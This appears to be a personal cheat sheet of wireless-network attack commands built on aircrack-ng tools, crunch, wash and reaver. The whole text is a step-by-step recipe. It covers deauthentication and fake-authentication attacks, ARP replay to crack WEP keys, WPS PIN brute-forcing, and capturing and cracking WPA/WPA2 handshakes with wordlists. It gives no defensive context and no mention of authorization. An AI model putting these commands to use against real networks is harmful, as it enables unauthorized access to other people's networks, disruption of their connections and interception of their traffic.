///PRE-CONNECTION///
Changing Adapter Modes:
- airmon-ng start (Adapter) [Puts adapter into Monitor]
- airmon-ng stop (Adapter) [Puts adapter into Managed]

Search for Networks:
- airodump-ng (Adapter in Mon mode)

Search for MACs on a Certain Network:
- airodump-ng --bssid (MAC of router) --channel (Channel) (Adapter in Mon mode)

Capture Packets:
- airodump-ng --bssid (MAC of router) --channel (Channel) --write (FileName) (Adapter in Mon mode)

DeAuth//FakeAuth Attack:
- aireplay-ng --deauth (number of packets) -a (bssid of router) -c (bssid of client) (Adapter in Mon mode)
- aireplay-ng --fakeauth (How long to wait before next auth. Ex. 30) -a (MAC of router) -h (MAC of WiFi adapter) (Adapter in Mon mode)

WEP Hacking // If not enough data is being sent, use ARP Replay Attack:
- Capture Packets
- aircrack-ng (.cap file from above)

ARP Replay Attack; Forces AP to generate lots of IVs:
- FakeAuth attack
- aireplay-ng --arpreplay -b (MAC of router) -h (MAC of WiFi adapter) (Adapter in Mon mode)

Creating a Wordlist:
- crunch (Min) (Max) (characters) -o (FileName) -t (Pattern)

---WPA/WPA2 Hacking---
Check if WPS is Enabled for WPA/WPA2 Networks:
- wash --interface (Adapter in Mon mode)
WPS 1.0 Attack (Mustn't Use Push Button Auth):
- reaver --bssid (MAC of router) --channel (Channel) --interface (Adapter in Mon mode) -vvv (Displays all info)  --no-associate (Use if doing a fake auth at the same time)
- Use Fake Auth
Capturing Handshake:
- Write captured packets to a file from a certain network; wait until handshake gets captured or use a DeAuth to force connection
- aircrack-ng (.cap file with handshake) -w (wordlist)
---END---
